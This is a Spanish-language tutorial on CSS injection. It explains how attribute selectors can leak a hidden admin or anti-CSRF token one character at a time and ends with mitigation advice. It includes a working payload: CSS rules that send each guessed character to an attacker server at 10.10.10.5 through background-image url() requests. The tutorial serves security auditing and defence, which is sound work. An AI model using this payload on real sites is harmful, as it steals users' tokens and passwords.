-- -
# 1. ¿Por qué ocurre?

Ocurre cuando la aplicación web permite que un usuario introduzca estilos CSS personalizados (por ejemplo, cambiar el color de fondo de su perfil) y los renderiza directamente en el HTML sin filtrar adecuadamente los caracteres de control de CSS.
# 2. El Impacto: Exfiltración de datos letra por letra (Exfiltration)

Aunque con CSS no puedes ejecutar un `alert()` o robar una cookie directamente con un script, **puedes usar selectores CSS avanzados para adivinar información confidencial expuesta en el HTML** (como tokens anti-CSRF o contraseñas ocultas en formularios) y enviarla a tu servidor atacante.

CSS tiene selectores que permiten aplicar estilos basándose en el valor de un atributo. Por ejemplo, el selector `input[value^="a"]` significa: _"Aplica este estilo a cualquier campo de texto cuyo valor empiece por la letra 'a'"_.
# 3. El Payload del Auditor

Imagina que en la página web que estás auditando hay un campo oculto con el token secreto del usuario administrador:

```HTML
<input type="hidden" id="token" value="c2f8..." />
```

Si logras inyectar CSS, puedes enviarle al navegador una lista de reglas como esta:

```CSS
input[value^="a"] { background-image: url(http://10.10.10.5/log?char=a); }
input[value^="b"] { background-image: url(http://10.10.10.5/log?char=b); }
input[value^="c"] { background-image: url(http://10.10.10.5/log?char=c); }
/* ... y así con todo el abecedario y números ... */
```
### ¿Qué pasa en el navegador de la víctima?

Como el valor del token empieza por la letra **`c`**, la tercera regla CSS se vuelve **Verdadera**. El navegador, para aplicar el estilo, se ve obligado a cargar la imagen de fondo haciendo una petición web automática a tu IP: `http://10.10.10.5/log?char=c`.

En tu servidor verás que te llegó la letra `c`. Acto seguido, generas dinámicamente un nuevo CSS buscando la segunda letra:

```CSS
input[value^="ca"] { background-image: url(...); }
input[value^="cb"] { background-image: url(...); }
input[value^="cc"] { background-image: url(...); }
```

Repitiendo este proceso de forma automatizada (exfiltración ciega), puedes **extraer contraseñas o tokens enteros del código HTML de la víctima** usando estrictamente hojas de estilo CSS. ¡Una locura de ataque!
# 4. Mitigación de CSSI

Al igual que con el XSS, la solución es la sanitización total. Si permites que los usuarios suban estilos, nunca debes permitir la inyección de caracteres como llaves `{}` ni corchetes `[]`, o mejor aún, usar librerías purificadoras de estilos (como _DOMPurify_ o filtros de backend estrictos) que deshabiliten selectores avanzados o el uso de la directiva `url()`.
-- -
